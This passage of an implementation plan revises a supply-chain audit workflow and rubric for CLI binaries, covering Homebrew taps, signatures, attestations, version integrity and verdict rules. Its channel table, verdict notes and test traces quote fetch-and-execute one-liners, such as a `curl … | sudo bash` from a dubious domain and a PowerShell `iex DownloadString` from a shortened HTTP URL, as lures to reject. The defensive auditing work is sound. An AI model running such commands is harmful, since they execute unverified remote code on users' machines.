- **VEX sources:** only the project's own VEX documents or advisory statements that name the version. Reachability output from a scanner you run (e.g. govulncheck reporting a vulnerable symbol as not called) is a note, not VEX evidence.

## Version & Update Integrity (§4.6)

Plug-ins for `references/criteria.md` §4.6. Shared rules and thresholds apply unchanged; these bullets only fill them.

- **V1** — *Publish time:* GitHub Releases → `publishedAt` (`gh release view <tag> -R <owner>/<repo> --json publishedAt`); Homebrew core → the upstream release date of the formula's version (Homebrew's review delay does not count toward V1); vendor-hosted → release notes or changelog date; install script → the release the script installs today. None found → `Not available`. *Version unit:* release tag + asset SHA-256; for an install script, script SHA-256 + the binary version it resolves to; a Homebrew core `revision` or bottle `rebuild` bump with unchanged source `url` and `sha256` is the same version (a Homebrew CI rebuild of an unchanged upstream release); a new upstream version is always a new version. *Condition wording:* these channels have no client cooldown setting, so name the previous release to install (exact tag asset, or a versioned formula `<name>@<version>` where Homebrew has one) or the date the version turns 72 h old.
- **V2** — *Mechanisms and commands:* § Signature & Checksum Standards. *Expected identity:* the repo, release workflow, key fingerprint or tap named in the vendor's own install/verification docs or README; else the identity the previous release carried. Record it and its source in the Version integrity row. *Absence:* the existing scoring stands (checksum only = moderate; no checksum or signature = MEDIUM-HIGH flag); absence where prior releases carried identity evidence is V3. *Curated pipeline — Homebrew core:* counts as verified for the Tier 1 identity requirement when (1) the name resolves to tap `homebrew/core` (`brew info <name>` prints a `From:` URL under `Homebrew/homebrew-core`; a `<user>/<tap>/<name>` install never qualifies) and (2) the formula's `url` points at the upstream project's documented source or release location. If `gh` is available, also verify the bottle attestation (`HOMEBREW_VERIFY_ATTESTATIONS=1`, identity `Homebrew/homebrew-core`); a failed verification is a V3 HIGH flag. Third-party taps are never curated pipelines.
- **V3** — *Diff against the previous release on the same channel:* signing method or signer (key fingerprint, attestation repo/workflow) | checksum file present | release author (CI bot vs manual upload) | immutability (prior releases immutable, this one not) | asset set (new installer types, post-install scripts) | install script: new domains fetched, new `sudo`, new persistence (LaunchAgent, systemd unit, shell rc edits) | Homebrew: formula `url` host or owner change, new `post_install`. *Ownership transfer:* repo transferred or renamed to a different owner, or a new publishing org → HIGH flag (tightens the shared ≥ MEDIUM floor).
- **V4** — *Incident sources:* the repo's GitHub Security Advisories; the vendor's security page or blog; `Homebrew/homebrew-core` issues and PRs that revert, disable or pin back the formula; OSV for the repo and its module/crate ecosystem.
- **V5** — *Triggers:* install script URL or domain change | signing key or attestation identity rotation | binary adds self-update, telemetry or a persistent service | Homebrew core formula disabled, deprecated or renamed. *Update controls:* download the audited tag's assets, never `latest`; Homebrew: `brew pin <formula>` holds `brew upgrade`; version and toolchain managers: pin the version in project config (e.g. `rust-toolchain.toml`, `.nvmrc`, `mise.toml`) and turn off built-in self-update where the tool offers it. For a binary that self-updates with no off switch, say updates cannot be held and list the triggers.
```

**Rationale:**
- homebrew/core fits the floor's curated-pipeline definition: a registry-operated build program with documented review and its own attestations. This gives eval 20 a Tier 1 path without the auditor running `gh`.
- The checks are the namespace and the pipeline source, as V2 requires. A failed attestation tightens to V3 HIGH.
- V1 uses the upstream date because the *code's* age is what the cooldown protects against. Using the formula-merge date would loosen the floor.
- The ownership transfer rated HIGH matches the existing workflow Toward CONDITIONAL "recently changed ownership".
- Tier 2 "No unresolved security incidents" aligns with V4 case (c): a resolved compromise is a LOW flag and doesn't force Tier 3.
- The Tier 3 trigger "Known prior incident" still forces depth; that is unchanged and intentional.

**Verification:**
```bash
grep -c "^## Version & Update Integrity (§4.6)$" references/criteria/cli-binary.md   # 1
grep -c "^- \*\*V[1-5]\*\* — " references/criteria/cli-binary.md                    # 5
grep -c "^## Own Code vs Third-Party Components (§4.3)$" references/criteria/cli-binary.md  # 1
grep -c "Curated pipeline — Homebrew core" references/criteria/cli-binary.md       # 1
```
Run the A2 check here. If a scanner name is unconfirmed, delete only that parenthetical example.

**If this fails:** revert to the post-Step-3 state and redo.

---

### Step 5: Workflow header, Identify, Evidence (Parts A + B)

**Objective:** carry B1–B4, B7, X1–X3 into the auditor's procedure.
**Confidence:** High
**Depends on:** Step 4 (cites addendum section names)
**Verify-Projex:** Encouraged

**Files:** `workflows/cli-binary.md`

**Changes:** five region replacements (base line numbers).

5a — L1–32 (header comment through the "Use `references/criteria/cli-binary.md` …" paragraph; keep `## Identify`) → replace with:

```markdown
<!--
workflows/cli-binary.md - Type 7 subject-specific workflow.
Handles CLI tools and standalone binaries distributed via GitHub
Releases, vendor-hosted downloads, Homebrew formulae (homebrew/core
and third-party taps), language-version and toolchain managers (nvm,
pyenv, rustup, mise, fnm, uv), install scripts (curl-pipe-bash), and
GoReleaser-built releases.
Cross-platform: Windows, macOS, Linux.

This workflow replaces workflows/generic.md for Type 7 subjects. After
producing findings here, return to SKILL.md Step N for the shared verdict
tree and report shape. The Audit Coverage table and audit-confidence
assertion are owned by the dispatcher — do not duplicate them here.
-->

# CLI Binary Workflow (Type 7)

This workflow handles **Type 7: cli-binary** subjects — standalone
executables installed onto `$PATH` (or equivalent), distributed outside
any registry that scores publisher trust. Covers GitHub Releases
binaries, vendor-hosted executables, Homebrew formulae (homebrew/core
and third-party taps; casks are desktop-app), language-version and
toolchain managers, install scripts (curl-pipe-bash), and
GoReleaser-built releases.

After completing all sections below, return to `SKILL.md` Step N for the
shared verdict tree and audit-coverage report shape.

Sections follow the standard workflow template: **Identify / Evidence /
Subject Rubric / Subject Verdict Notes**.

Use `references/criteria/cli-binary.md` for cli-binary-specific
tiering and scoring. When it conflicts with the shared rubric, the more
specific cli-binary guidance wins — except `references/criteria.md`
§4.6 (version-integrity floor) and the §4.3 Blocking CVE classes, which
it only tightens or fills.
```

5b — L38–54 (channel table + "For each subject, record" list; keep `### 2. Extract available metadata`) → replace with:

```markdown
| Channel | URL / command pattern | Adoption metric |
|---------|---------------------|-----------------|
| Homebrew core formula | `brew install <name>` resolving to tap `homebrew/core`; `formulae.brew.sh/formula/*` | Install count (analytics) |
| Homebrew third-party tap | `brew install <user>/<tap>/<name>`; `brew tap <user>/<tap>` then `brew install <name>` | Tap repo stars |
| GitHub Releases (org) | `github.com/<org>/<repo>/releases`, download from Releases page | Download count per asset |
| GitHub Releases (personal) | `github.com/<user>/<repo>/releases` | Download count per asset |
| GoReleaser | Release assets with `checksums.txt`, multiple OS/arch binaries | Download count |
| Vendor-hosted binary | Vendor website download page, `get.<vendor>.com` | Website traffic / brand |
| Language-version / toolchain manager | `curl … \| sh` (rustup, nvm, mise, fnm, uv), `pyenv install` | GitHub stars + community |
| Install script (curl-pipe-bash) | `curl -sSL <url> \| sh`, `wget -qO- <url> \| bash`; PowerShell `irm <url> \| iex`, `iwr <url> \| iex`, `iex ((New-Object Net.WebClient).DownloadString('<url>'))` | Script source reputation |
| Third-party mirror / shared copy | Non-vendor download site, forum link, file host, network share, chat attachment | None |

For each subject, record:
- **Binary name + version** (or "latest" if unversioned)
- **Distribution channel** (from table above)
- **Homebrew tap** — for `brew install`: `brew info <name>` prints a
  `From:` URL; `Homebrew/homebrew-core` = core. A fully qualified
  `<user>/<tap>/<name>` is never core
- **Source URL** (GitHub repo, vendor site, or install script URL)
- **Install-command source** — where the user got the command (vendor
  docs or repo README, ad, search result, forum, chat, AI answer, a page
  asking them to paste it to "verify")
- **Target platform** (OS + architecture)
- **Install command** (exact command the user will run)
```

5c — L61–67 (metadata bullets `**Release date**` … `**Install script**`; keep `### 3. Required context`) → replace with:

```markdown
- **Release date** — when this version was published (§4.6 V1)
- **Release assets** — list of files (binaries, checksums, signatures)
- **License** — from repo or release notes
- **Checksum file** — presence of SHA-256/SHA-512 checksum file in release assets
- **Signature / attestation** — GPG `.asc`/`.sig`, Minisign `.minisig`,
  Sigstore bundle, GitHub artifact or release attestation (immutable
  release), SLSA provenance
- **Expected identity** — the repo, release workflow, key fingerprint
  or Homebrew tap the vendor documents (§4.6 V2), and where it says so
- **Install script** — if distribution is via script, note the script URL
```

(The `**Author / organization**` and `**Repository**` bullets at L59–60 stay; the region starts at `- **Release date**` (L61). Check: the old `**Signature**` and `**SLSA attestation**` bullets are gone.)

5d — L82–94 (the three tier paragraphs; keep `## Evidence — Part B`) → replace with:

```markdown
**Tier 1 — Quick Audit:** Well-known project, Homebrew core formula or
established GitHub org, checksum + identity verified per §4.6 V2
(homebrew/core counts via its curated pipeline), project >= 1yr old,
no incidents, `references/criteria.md` §4.6 raises nothing that bars
Tier 1, no install-script-only distribution. Scope: §4.1 Provenance +
§4.3 Security (CVEs) + §4.6 Version integrity.

**Tier 2 — Standard Audit (default):** Recognizable channel (incl. a
Homebrew tap the vendor documents), checksum available, identifiable
author, no unresolved incidents, project > 30 days old. Scope: all §4.x
sections per shared rubric.

**Tier 3 — Deep Audit:** Any red-flag trigger (curl-pipe-sh or
PowerShell `irm | iex`, no checksum/signature, unknown source, third-party mirror or undocumented
tap, chat-shared, install command from an ad / search result /
paste-to-verify page, identity mismatch with vendor docs or the previous
release, new project, prior incident, privilege request). Scope: all
§4.x + full install-script review + provenance deep-dive + alternatives
assessment.
```

5e — L102–151 (core research questions 1–10, Distribution channel research, Checksum & signature verification, Incident & reputation research; keep `### Audit coverage tracking`) → replace with:

```markdown
1. **Who published this binary?** Identify the author/org. Verify GitHub
   org membership or vendor identity. Is the publisher the same as the
   upstream project author? Is the install command or URL the one in the
   vendor's own docs or repo README, reached directly?
2. **Is the source code available?** Open-source repo? Does the release
   tag match the source? Can the binary be built from source?
3. **Is a checksum provided?** SHA-256/SHA-512 file in release assets?
   Is the checksum file served from the same origin as the binary, or
   from a separate trust channel? Is the checksum file itself signed?
4. **Is the binary signed or attested?** GPG, Minisign, Sigstore bundle,
   GitHub artifact or release attestation, SLSA provenance? Does
   verification pass **and** name the expected identity (§4.6 V2)?
5. **Is the release immutable?** `gh release view <tag> -R
   <owner>/<repo> --json isImmutable,publishedAt,author`.
6. **Is the install method a pipe-to-shell script?** If yes: is the
   script auditable? Is it served over HTTPS? What does it actually do?
   Does it download a binary and verify its checksum, or does it execute
   arbitrary code without verification? Apply the executed-bytes rule
   (`references/criteria/cli-binary.md` Install Script Risk).
7. **What does the binary do at runtime?** Network access, file system
   writes, privilege escalation, persistent services? Does it phone home?
8. **Are there known CVEs or security incidents?** Search OSV, GHSA,
   vendor advisories, and web for the binary name + "vulnerability" or
   "compromise". Classify each CVE as own code or third-party component
   (addendum §4.3 plug-in).
9. **Is it actively maintained?** Last release date, commit frequency,
   issue responsiveness. Have the maintainers declared it unmaintained?
10. **How does this version differ from the previous release?** Signer,
    release author, asset set, install-script behavior (§4.6 V3).
11. **Are there alternatives?** Package-manager-distributed alternatives
    (brew, apt, cargo install) that provide stronger provenance?

### Distribution channel research

- **Homebrew core formula:** Confirm the tap (`brew info <name>` `From:` line). Read the formula in `Homebrew/homebrew-core`: `url` points at the upstream project's documented source, `sha256` is pinned, and recent formula commits don't change the `url` host or owner. Bottles are built and attested by Homebrew CI; if `gh` is available, verify with `HOMEBREW_VERIFY_ATTESTATIONS=1` (opt-in as of 2026-10).
- **Homebrew third-party tap:** Identify the tap owner and whether the upstream project's own docs name this tap. Read the formula Ruby, which runs with the user's privileges when loaded: `url`, `sha256`, `install` / `post_install` blocks. Homebrew does not review taps; `brew trust` (Homebrew 6.0.0+) only records the user's consent.
- **GitHub Releases:** Check release page: author, tag, CI artifacts, checksum file, signature/attestation files. Compare release author to repo owner. Check if release was created by GitHub Actions (CI-built) or manually uploaded, and whether it is immutable.
- **Vendor-hosted:** Verify the download URL against the vendor's documented domain, reached directly rather than via an ad or search result. Check for HTTPS. Look for a checksum/signature on the download page.
- **Install script (incl. PowerShell `irm … | iex` forms):** Download the script to a file (do NOT pipe to shell), read that file, and record its SHA-256; if approved, the user runs that same file. Assess: what URLs does it fetch? Does it verify checksums? Does it require sudo / an Administrator session? What does it install and where? Are there any obfuscated or encoded sections? A URL shortener, redirector, paste site, raw IP or plain-HTTP URL is an unverifiable source; expand a shortener only to report its target, never to run it.
- **Mirror / shared copy:** Hash the file and compare with the vendor's signed checksum file for that exact version (verify the checksum file's signature first). Match → channel risk is a note. No match or no signed checksum → rate as third-party mirror.

### Checksum & signature verification

For every tier (Tier 1 needs verified identity or the homebrew/core
curated pipeline), verify or document inability to verify. Commands and
identity values: `references/criteria/cli-binary.md` Signature &
Checksum Standards.

1. Download the checksum file (e.g., `checksums.txt`, `SHA256SUMS`)
2. Verify the binary's hash matches the checksum file entry
3. Verify identity with the method's command, bound to the expected
   identity: `gh release verify` / `gh release verify-asset`,
   `gh attestation verify --repo`, `cosign verify-blob --bundle` with
   `--certificate-identity` + `--certificate-oidc-issuer`,
   `slsa-verifier verify-artifact --source-uri`, or a GPG/Minisign key
   matched against vendor docs
4. Record the expected identity, its source and the result in the
   Version integrity row. Presence alone earns no credit
5. Run these tools under the audit-tooling note in
   `references/criteria.md`; if you cannot, record
   `Not available (<why>)`

### Incident & reputation research

- Search: `"<binary-name>" vulnerability`, `"<binary-name>" compromise`, `"<binary-name>" malware`
- Check GitHub Security Advisories for the repo
- Check if the project has been transferred, archived, or changed ownership recently
- For a past compromise, record its affected range and remediation (§4.6 V4)
- For language-version managers: check for known supply-chain incidents in their install pipeline
```

**Rationale:** the workflow is what the auditor follows step by step, so the identity binding, tap check, executed-bytes rule and verified-copy rule each appear where the auditor acts on them. Details stay in the addendum, which keeps the workflow growth small (DRY). Question 10 (V3) gives the diff a home in the research flow.

**Verification:** `grep -c "Homebrew third-party tap" workflows/cli-binary.md` ≥ 2; `grep -c "verify-blob\` or transparency log" workflows/cli-binary.md` → 0; `grep -n "^## \|^### " workflows/cli-binary.md` shows the original heading order, with `### Audit coverage tracking` still present.

**If this fails:** `git -C <work-root> checkout -- workflows/cli-binary.md` and redo 5a–5e from the bottom region upward. That way line numbers stay valid; executor may also anchor on heading text.

---

### Step 6: Workflow coverage table, Subject Rubric, Verdict Notes

**Objective:** B1, B3, B5, B6 in the rubric and verdict notes. Fix the §4.6 heading collision. Add identity / version-integrity coverage rows.
**Confidence:** High
**Depends on:** Step 5
**Verify-Projex:** Encouraged (B5/B6 move verdicts; eval 30)

**Files:** `workflows/cli-binary.md`

**Changes:** replace from the coverage table header `| Check | Tier 1 | Tier 2 | Tier 3 |` to end of file (base L158–262; the table's lead-in sentence stays) with:

```markdown
| Check | Tier 1 | Tier 2 | Tier 3 |
|-------|--------|--------|--------|
| Binary identity + channel (incl. Homebrew tap) | Yes | Yes | Yes |
| Install-command source (vendor docs vs ad / search / lure) | Yes | Yes | Yes |
| Author/org verification | Brief | Yes | Deep |
| Checksum verification | Yes | Yes | Yes |
| Identity verification (§4.6 V2) | Match expected identity (or homebrew/core pipeline) | Verify if available | Verify or flag absence |
| SLSA provenance | Covered by identity row | Check | Verify |
| Version integrity (§4.6 V1, V3–V5) | Age + quick V3 check | Yes | Full diff vs previous release |
| Install script review | N/A (no script) | If applicable | Full review |
| Source code availability | Note | Review repo | Deep review |
| CVE / incident search | Quick | Standard | Comprehensive |
| Runtime behavior | Skip | Brief | Deep |
| Alternatives assessment | Skip | Note | Full comparison |
| Maintenance status | Note | Check | Deep review |
| Build provenance | Note | Check CI | Verify pipeline |

## Subject Rubric

Apply `references/criteria.md` with these cli-binary-specific
overrides. Cite `references/criteria/cli-binary.md` for detailed
scoring.

### §4.1 Provenance — Binary Authenticity

- **Primary axis: checksum + identity verification** matched to the
  expected identity (§4.6 V2). A verified, checksummed binary from a
  known author/org is the strongest provenance signal; a signature that
  is present but unverified or unmatched earns nothing. An unsigned
  binary with no checksum from an unknown source is the weakest.
- Assess the release pipeline: CI-built (strong) vs manual upload
  (weaker); an immutable release is a further positive.
- GitHub: verify release author matches repo org/owner. Check for branch
  protection and required CI checks.
- Install scripts: assess the script's own provenance (URL traced to
  vendor docs? HTTPS? auditable content?) and apply the executed-bytes
  rule.
- Homebrew core: trust comes from maintainer review + the Homebrew CI
  bottle build (curated pipeline), not from the user's option to build
  from source. Third-party tap: trust = the tap owner (vendor-documented
  tap → vendor channel; otherwise repackager).
- Mirror / shared copy: bytes verified against the vendor's signed
  checksum → channel risk is a note.

### §4.2 Maintenance & Project Health

- Last release date, commit frequency, open issue responsiveness.
- Bus factor: single maintainer vs team/org.
- For language-version managers: assess the governing project (e.g. the
  Rust project for rustup; nvm is an OpenJS Foundation project).
  Governance is a maintenance signal, not install-time verification.
- A project its maintainers declare unmaintained (e.g. Volta, Nov 2025)
  is Abandoned; name the successor they recommend.
- Archived or transferred repos are strong negative signals.

### §4.3 Security — Vulnerabilities & Incidents

- Check OSV/GHSA for the binary name and its source repo.
- Search for prior supply-chain compromises (especially for install scripts
  and widely-used binaries).
- Assess dependency chain if the binary is a compiled artifact (Go, Rust
  binaries ship their deps statically).
- Classify CVEs as own code or third-party component per
  `references/criteria/cli-binary.md` Own Code vs Third-Party Components
  (§4.3); verdict classes per `SKILL.md` "Blocking CVE".
- For install scripts: the script itself is the primary attack surface.

### §4.4 Permissions & Access

- What privileges does the binary require? User-level, root/admin, or mixed?
- Does the install script require `sudo`? Is the elevated access justified?
- Does the binary create persistent services (daemons, launch agents, systemd units)?
- Does the binary modify system paths, shell configs, or environment variables?
- Network access: does it phone home, check for updates, send telemetry?

### §4.5 Reliability & Stability

- Is the binary statically linked or does it pull runtime dependencies?
- Does it work across the target platform versions?
- Is there an uninstall/removal path?
- For install scripts: is there an uninstall script or documented removal steps?

### §4.6 Version & Update Integrity

- Apply `references/criteria.md` §4.6 with the plug-ins in
  `references/criteria/cli-binary.md` Version & Update Integrity (§4.6).
- Version age from the release date (Homebrew core: the upstream
  release date); identity per V2; diff against the previous release
  (V3); scope any past compromise by version (V4).
- Recommendation names the update control: the pinned tag's assets,
  `brew pin`, or the toolchain pin file (V5).

### Alternatives & Ecosystem Fit

- Is there a package-manager-distributed alternative (brew, apt, cargo install)?
- Is there a containerized alternative (docker run)?
- Does the project offer multiple install methods? (Binary download, package
  manager, build from source — breadth of options is a positive signal.)
- For language-version managers: are there alternatives with better provenance
  or security posture?

## Subject Verdict Notes

### Toward REJECTED

- Install script (`curl | sudo sh`) from unknown or unverifiable source
- Pipe-to-shell in any shell (`curl … | sh`, PowerShell `irm … | iex`,
  `iex (… DownloadString …)`) from a URL that hides the publisher
  (shortener, redirector, paste site, raw IP) or uses plain HTTP
- Install-command lure: reached via ad or sponsored result, or presented
  as a paste-to-verify / fix-an-error step, and not the vendor's
  documented command
- Install URL on a lookalike of the vendor's domain (`SKILL.md` Red Flag
  "Confirmed typosquat / impersonation")
- No checksum AND no signature AND no package-manager alternative
- Binary from third-party mirror or repackager (not original author)
  whose bytes cannot be verified against the author's signed checksum
- Supply-chain compromise that covers the version to be installed, has
  no bounded range, or is unresolved (`references/criteria.md` §4.6 V4
  case a)
- Binary requires root/admin with no clear justification
- Obfuscated or encoded sections in install script

### Toward CONDITIONAL

- Install script from known vendor (note pipe-to-shell risk; recommend
  the executed-bytes rule: download, inspect, hash, run that file)
- Checksum available but no signature (note: integrity without authenticity)
- Legitimate binary via an informal channel (shared drive, Slack, forum,
  mirror) whose bytes are not yet verified — condition: verify its
  SHA-256 against the vendor's signed checksum for that version, or
  reinstall from the official source. Once verified, the channel is a
  note
- Single maintainer project with no CI (note bus factor + build provenance risk)
- Vendor-hosted binary unsigned but from known, reputable vendor
- Homebrew third-party tap the vendor documents, with no verified
  identity
- Project recently changed ownership or was transferred (§4.6 V3)
- Project abandoned (no releases > 2 years, archived repo, unresponsive
  maintainer, or declared unmaintained) — CONDITIONAL per the
  `SKILL.md` tree; condition names a maintained alternative. REJECTED
  only together with another REJECTED trigger (Blocking CVE, §4.6 V4
  case a)
- Version < 72 h old, or identity evidence missing or changed vs the
  previous release (§4.6 V1, V3)

### Toward APPROVED

- Homebrew core formula (tap `homebrew/core`) whose `url` is the
  upstream project's documented source (curated pipeline, §4.6 V2)
- GitHub Releases from established org with CI-built artifacts +
  checksum + signature or attestation verified against the project's
  repo and release workflow (immutable release a plus)
- Well-known, maintained language-version manager (e.g. rustup, nvm,
  mise) from an established project
- Established project (>= 1yr, broad adoption, active maintenance)
- Multiple install methods available (binary, package manager, source)
- SLSA L2+ provenance verified against the project repo
```

**Rationale:**
- **B5.** Toward REJECTED items are rated CRITICAL (`SKILL.md` "CRITICAL flag"), so leaving "abandoned" there would contradict the tree node and the landed §4.2 line. Moving it carries the same escape clause as §4.2.
- **B6.** The mirror bullet now requires *unverifiable* bytes, and the informal-channel bullet carries the verify condition. Eval 30 (terraform on a share, not yet verified, signed SHA256SUMS available) therefore resolves to CONDITIONAL deterministically.
- **The rename fixes the collision.** The new §4.6 section points to the plug-ins rather than repeating them.

**Verification:**
```bash
awk '/^### Toward REJECTED/{f=1;next}/^### /{f=0}f' workflows/cli-binary.md | grep -ci abandon     # 0
awk '/^### Toward CONDITIONAL/{f=1;next}/^### /{f=0}f' workflows/cli-binary.md | grep -c "REJECTED"  # 1
grep -c "^### §4.6 Version & Update Integrity$\|^### Alternatives & Ecosystem Fit$" workflows/cli-binary.md  # 2
grep -ci "from established foundation\|Node.js Foundation\|### §4.6 Alternatives" workflows/cli-binary.md  # 0
```

**If this fails:** revert to the post-Step-5 state and redo.

---

## Verification Plan

### Automated Checks

- [ ] `python3 evals/run_evals.py validate` passes; unittest passes with the Preflight count.
- [ ] Consistency script (from `<work-root>`; not committed):
```bash
python3 - <<'EOF'
import re, pathlib
W = pathlib.Path("workflows/cli-binary.md").read_text(encoding="utf-8")
A = pathlib.Path("references/criteria/cli-binary.md").read_text(encoding="utf-8")
assert A.count("\n## Version & Update Integrity (§4.6)\n") == 1
assert len(re.findall(r"^- \*\*V[1-5]\*\* — ", A, re.M)) == 5
assert A.count("\n## Own Code vs Third-Party Components (§4.3)\n") == 1
assert "Curated pipeline — Homebrew core" in A
for t in (W, A):
    assert "Homebrew third-party tap" in t
    for v in re.findall(r"§4\.6 (V\d)", t): assert v in {"V1","V2","V3","V4","V5"}, v
    low = t.lower()
    for bad in ["node.js foundation", "from established foundation", "build-from-source option",
                "provides audit trail", "### §4.6 alternatives", "verify-blob` or transparency log"]:
        assert bad not in low, bad
assert "irm" in W and "irm" in A and "shortener" in W and "shortener" in A
for s in ["gh release verify", "gh release verify-asset", "gh attestation verify",
          "--certificate-identity", "--certificate-oidc-issuer", "--source-uri"]:
    assert s in A, s
rej = W.split("### Toward REJECTED")[1].split("### Toward CONDITIONAL")[0]
con = W.split("### Toward CONDITIONAL")[1].split("### Toward APPROVED")[0]
assert "abandon" not in rej.lower() and "abandoned" in con.lower()
assert "### §4.6 Version & Update Integrity" in W and "### Alternatives & Ecosystem Fit" in W
print("OK")
EOF
```
- [ ] `git -C <work-root> diff --stat <base>..HEAD` → exactly the 2 files.

### Manual Verification (paper traces)

Walk each case through `SKILL.md` Step N + `references/criteria.md` §4.3/§4.6 + both edited files, and log the rule cited per hop.

| # | Case | Expected |
|---|---|---|
| T1 | eval 20: `brew install ripgrep` | core tap + `url` → upstream → curated pipeline = Tier 1 identity; ≥ 7 d (A3) → Tier 1 → **APPROVED** ✓ |
| T2 | eval 21: `curl -sSL https://totally-legit-tools.xyz/install.sh \| sudo bash` from a blog | Tier 3; Toward REJECTED (unknown-source sudo script) → CRITICAL → **REJECTED** ✓ |
| T3 | eval 30: terraform on a colleague's share, not yet hashed | mirror bullet doesn't fire (HashiCorp signs SHA256SUMS → verifiable); informal-channel bullet → **CONDITIONAL**, condition: verify SHA-256 vs signed SHA256SUMS or use official channel ✓ |
| T4 | Same terraform copy, hash matches SHA256SUMS whose `.sig` verifies with a HashiCorp key fingerprint from vendor docs | channel → note; V2 verified → **APPROVED reachable** |
| T5 | `brew install <vendor>/<tap>/<tool>`, tap named in vendor docs | vendor channel; no Homebrew credit; Tier 1 barred (not core) → Tier 2 → per V2/V3: APPROVED or CONDITIONAL |
| T6 | `brew install someuser/tools/ripgrep` (tap not in upstream docs) | repackager → Tier 3; bytes verifiable vs upstream → ≥ CONDITIONAL, else REJECTED; never Tier 1 |
| T7 | Page says "paste this in Terminal to verify you are human": `curl … \| bash` from a non-vendor domain | lure → CRITICAL → **REJECTED** |
| T8 | Established org, immutable release 10 d old, `gh release verify-asset` passes for the documented repo | V1 ok, V2 verified, V3 clean → Tier 1 → **APPROVED** |
| T9 | Same org, release 20 h old, attestation from a different workflow than prior releases | V1 HIGH + V3 HIGH → **CONDITIONAL** (escalation notice: V3 isn't exempt) |
| T10 | Volta via its install script | maintainers declared it unmaintained → Abandoned → **CONDITIONAL**, condition names mise; not REJECTED (B5) |
| T11 | Go binary, HIGH CVE in a statically linked module, not KEV, no new binary release | third-party component → HIGH flag → **CONDITIONAL** (mitigation + re-audit on fixed release); not REJECTED (C6) |
| T12 | Own-code CRITICAL in the requested version, listed in CISA KEV | Blocking CVE → **REJECTED**; Recommendation names the fixed release |
| T13 | eval 34 (after the classifier plan re-routes it): forum one-liner `iex ((New-Object System.Net.WebClient).DownloadString('http://bit.ly/toolsetup'))` | Tier 3 (PowerShell pipe-to-shell); Toward REJECTED: pipe-to-shell from a shortener + plain HTTP → CRITICAL → **REJECTED**; report names `iex` remote code execution + the shortened URL (eval 34's remaining assertions ✓) |
| T14 | `irm https://<vendor>/install.ps1 \| iex`, URL on the vendor's own install page | same as known-vendor `curl \| sh`: Tier 2+, LOW-MEDIUM flag, executed-bytes rule recommended → per the rest of the rubric (not auto-REJECTED) |

### Acceptance Criteria Validation

| Criterion | How to Verify | Expected Result |
|---|---|---|
| Plug-ins present (§4.6 V1–V5, §4.3) | Step 4 greps; script | 1 / 5 / 1; `OK` |
| Curated pipeline | grep | 1 |
| Core vs tap rows | script | `OK` |
| Commands present | script | `OK` |
| Stale strings gone | script | `OK` |
| B5 placement | Step 6 awk; script | 0 / 1; `OK` |
| V refs resolve | script | `OK` |
| Harness green | validate + unittest | pass; same count |
| Traces | log T1–T14 | match |
| Only 2 files | `git diff --stat` | 2 files |

---

## Rollback Plan

1. Before close: `projex-abandon.sh <repo-root> claude/youthful-dijkstra-5ov1kt projex/2610162006-cli-binary-rubric-refresh --worktree`.
2. After squash-close: `git -C <repo-root> revert <squash-sha>`. It touches only the 2 files; nothing depends on them mechanically.

---

## Notes

### Hand-off (not this plan's files)

| Owner | Item |
|---|---|
| Classifier plan (2610162004-generic-fallback-and-classifier-refresh-plan.md) | `references/classifier.md` L72 "Formula review + checksum + build-from-source" → "maintainer review + Homebrew CI bottle". L88 and `SKILL.md` L51: add `brew install <user>/<tap>/<formula>` (third-party tap) → cli-binary (a tap `--cask` → desktop-app); replace example `volta` with `mise` (Volta unmaintained) |
| Orchestrator | `workflows/agent-extension.md` L193 `### §4.6 Maintenance & Ecosystem` and `workflows/remote-integration.md` L137 `### §4.6 Integration Hygiene` collide with the shared §4.6 the same way. Relay to those planners. Also update the `STEWARDSHIP.md` cli-binary row dates |
| Desktop-app planner | Homebrew's own security doc (`Homebrew/brew` `docs/Homebrew-Security-and-Supply-Chain.md`, last_review 2026-09-19) is a primary source for D5. It says official casks must pass Gatekeeper on a default macOS config, and failing casks are deprecated → disabled → removed. Casks get quarantine attributes. Third-party taps need `brew trust` since Homebrew 6.0.0. It does not confirm that the 2026-09-01 disable actually happened |
| Eval plan | **Description update:** eval 20 `expected_output` "Homebrew core formula with build-from-source option" → "homebrew/core (maintainer-reviewed; bottle built and attested by Homebrew CI)". No assertion changes. **Time-dependent:** eval 20 Tier 1 / APPROVED needs ripgrep's latest release ≥ 7 d / ≥ 72 h old (A3). **New cases** (traces above): T4 verified share copy → APPROVED; T5/T6 tap → not Tier 1; T7 lure → REJECTED; T8 immutable + attested → APPROVED; T9 fresh + signer drift → CONDITIONAL; T10 Volta → CONDITIONAL; T11 static-dep CVE → CONDITIONAL. **Eval 34:** this rubric now satisfies the re-expectation the classifier plan hands the eval plan (cli-binary + REJECTED; iex / shortener assertions), per T13 |

### Risks

- **Homebrew facts drift** (attestation default, tap trust). Mitigation: "as of 2026-10" markers; the rules key on "verify when possible", not on the default.
- **Curated-pipeline overcredit.** A compromised core formula PR is still possible. Mitigation: V1 upstream age, V3 `url` diff and V4 incident sources still apply; the credit covers only the Tier 1 identity requirement.
- **Lure rule false positives** on legitimate paste-in-terminal install pages. Mitigation: both conditions are required (lure framing **and** not the vendor's documented command).
- **Auditor can't run `gh`/`cosign`.** Mitigation: `Not available (<why>)` → no identity credit → Tier 2. That costs depth, not a wrong verdict. homebrew/core still reaches Tier 1 through the namespace and `url` checks.

### Facts not verified (kept out or hedged)

- Immutable-release coverage details: from a docs.github.com search summary; the page itself was not fetched (WebFetch DNS failed). They are hedged as table notes, and the commands themselves were confirmed in the `cli/cli` source.
- The exact gh version that introduced `release verify`: the commands are present in the v2.80.0 tree, while third-party release notes say v2.81.0. Not codified.
- GoReleaser emitting one Sigstore bundle per artifact (B7): not codified.
- Fake-Homebrew / ClickFix campaign specifics (B4): not codified by name; the rule is principle-based.
- `govulncheck -mode=binary`, `cargo audit bin`: A2, checked at execution.
- Whether `brew verify` (a dev-cmd) runs without developer mode: not used; the plan uses `HOMEBREW_VERIFY_ATTESTATIONS` instead.

### Open Questions

None. B1–B7 are fully covered here or by the floor (B5's shared half, X3's note). C6 is applied through the §4.3 plug-in, and the classifier, eval and sibling items are in the Hand-off.

### Split Decision

`No split — heuristic tripped (~956 lines / ~75 KB, 6 steps) but steps tightly coupled.` Rationale:
- One projex scope, 2 files.
- ~470 lines are verbatim After text, i.e. the complete new content of both files. The rest is a single shared Context and Verification.
- Steps 5–6 cite addendum section names that Steps 1–4 create. An addendum-only / workflow-only split would leave an interim base where the workflow points at headings that don't exist, and would duplicate the Context and Verification.
- Rejected alternative: split into addendum + workflow plans.
